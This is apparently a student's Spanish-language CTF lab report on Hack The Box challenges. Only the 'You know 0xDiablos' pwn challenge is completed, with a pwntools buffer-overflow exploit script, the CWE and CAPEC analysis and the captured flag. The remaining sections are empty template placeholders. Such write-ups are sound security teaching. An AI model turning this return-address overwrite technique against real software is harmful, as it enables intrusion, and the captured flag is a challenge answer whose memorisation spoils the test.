# Seguridad-P2

## Índice

- [PWD](#pwd)
  - [Challenge 1](#challenge-1)
  - [Challenge 2](#challenge-2)

- [Reversing](#reversing)
  - [Challenge 1: Rega's Town](#challenge-1-regas-town)
  - [Challenge 2](#challenge-2-1)

- [Web](#web)
  - [Challenge 1](#challenge-1-1)
  - [Challenge 2](#challenge-2-2)

- [Tabla resumen de retos resueltos](#tabla-resumen-de-retos-resueltos)

- [Timeline de resolución retos](#timeline-de-resolución-retos)


# PWD

## Challenge 1: You know 0xDiablos pts[20]

### 1. Procedimiento seguido (screenshots y explicaciones).

Primeramente se obtiene información sobre el archivo binario para saber posibles
direcciones por las que se pueda vulnerar el programa.

![alt text](media/P1-1.png)

Con la información que se refleja en la imagen se puede saber que no tiene
protecciones del stack como tal. Por lo que a continuación se procede a revisar
el código utilizando Ghidra para analizar el binario.

![alt text](media/P1-2.png)

Como se denota en la imagen la función `vuln()` utiliza el método `gets()` el
cual es extremadamente vulnerable al ataque de buffer overflow. De manera
adicional hay una función llamada `flag()` la cual imprime la bandera cuando es
ejecutada, como se ve a continuación:

![alt text](media/P1-3.png)

Ya sabiendo que se puede hacer un buffer overflow para influenciar en el flujo
de ejecución y ejecutar la función `flag()`, se procede a calcular el tamaño
del payload necesario para sobrescribir el return address.

El buffer declarado en `vuln()` tiene un tamaño de 180 bytes. Sumando 4 bytes
de alineación y 4 bytes del EBP guardado, se necesitan **188 bytes de padding**
antes de poder sobrescribir el return address.

![alt text](media/P1-4.png)

Con la dirección de entrada de `flag()` identificada en `0x080491e2`, se
construye el payload. Sin embargo, para que `flag()` imprima la bandera
también es necesario que sus dos parámetros tengan los valores correctos:
`param_1 = 0xDEADBEEF` y `param_2 = 0xC0DED00D`, esto según el código visto en Ghidra.

En arquitecturas x86 de 32 bits los argumentos se pasan en el stack, por lo
que el payload final queda estructurado de la siguiente manera:

| Sección | Contenido | Tamaño |
|---|---|---|
| Padding | `'A' * 188` | 188 bytes |
| Return address | `0x080491e2` en little-endian | 4 bytes |
| Fake return address | `'AAAA'` | 4 bytes |
| param_1 | `0xDEADBEEF` en little-endian | 4 bytes |
| param_2 | `0xC0DED00D` en little-endian | 4 bytes |

El exploit se implementa con pwntools de la siguiente manera:

```python
from pwn import *

payload  = b'A' * 188
payload += p32(0x080491e2)  # dirección de flag()
payload += b'A' * 4         # fake return address
payload += p32(0xDEADBEEF)  # param_1
payload += p32(0xC0DED00D)  # param_2

io = remote('IP de HTB', PORT de HTB)
io.sendline(payload)
io.interactive()
```

Al ejecutar el exploit contra el servidor de HackTheBox, el programa redirige
su ejecución hacia `flag()` con los parámetros correctos y se obtiene la
bandera:

![alt text](media/P1-5.png)

---

### 2. Lista de herramientas utilizadas

| Herramienta | Propósito |
|---|---|
| `checksec` | Verificar las protecciones del binario |
| `Ghidra` | Análisis estático y decompilación del binario |
| `GDB + pwndbg` | Depuración dinámica y análisis del stack |
| `pwntools` | Construcción y envío del payload |

---

### 3. Debilidad que dio origen a la vulnerabilidad (CWE)

**CWE-121: Stack-based Buffer Overflow**

La vulnerabilidad se origina en el uso de la función `gets()` dentro de
`vuln()`, la cual no realiza ninguna validación del tamaño del input recibido.
Esto permite escribir más datos de los que el buffer puede contener, desbordando
hacia el stack y sobrescribiendo el return address con una dirección arbitraria.

De manera secundaria aplica:

**CWE-242: Use of Inherently Dangerous Function**

`gets()` está catalogada como una función inherentemente peligrosa y ha sido
eliminada del estándar C11 precisamente por no ofrecer ningún mecanismo de
control de límites. Su uso en cualquier contexto representa una vulnerabilidad
directa.

---

### 4. Patrón de ataque (CAPEC)

**CAPEC-100: Overflow Buffers**

El ataque consiste en enviar un input deliberadamente más largo que el buffer
asignado para sobrescribir datos críticos del stack, en este caso el return
address del stack frame de `vuln()`. Al redirigir la ejecución hacia `flag()`
con los parámetros correctos ubicados en el stack, se logra ejecutar código
que el flujo normal del programa nunca alcanzaría.

---

### 5. Bandera

La bandera obtenido corresponde a: `HTB{16b0ab4fc3cd8ba880c692bc5dd4eaf3}`

## Challenge 2:  pts[20]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

---

# Reversing

## Challenge 1: Rega's Town pts[30]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

## Challenge 2 pts[]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

---

# Web

## Challenge 1 pts[]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

## Challenge 2 pts[]

1. Procedimiento seguido (screenshots y explicaciones).
2. Lista de herramientas utilizadas.
3. Debilidad que dio origen a la vulnerabilidad (código CWE).
4. Patrón de ataque que se siguió para explotar la vulnerabilidad (código CAPEC).
5. “Bandera”

---

# Tabla resumen de retos resueltos

| Categoría | Challenge | Estado | Bandera |
|---|---|---|---|
| PWD | Challenge 1 | ✅/❌ | |
| PWD | Challenge 2 | ✅/❌ | |
| Reversing | Rega's Town | ✅/❌ | |
| Reversing | Challenge 2 | ✅/❌ | |
| Web | Challenge 1 | ✅/❌ | |
| Web | Challenge 2 | ✅/❌ | |

---

# Timeline de resolución retos

| Fecha | Challenge | Acción realizada | Resultado |
|---|---|---|---|
| YYYY-MM-DD | Ejemplo | Reconocimiento inicial | Acceso obtenido |
| YYYY-MM-DD | Ejemplo | Reversing binario | Flag encontrada |
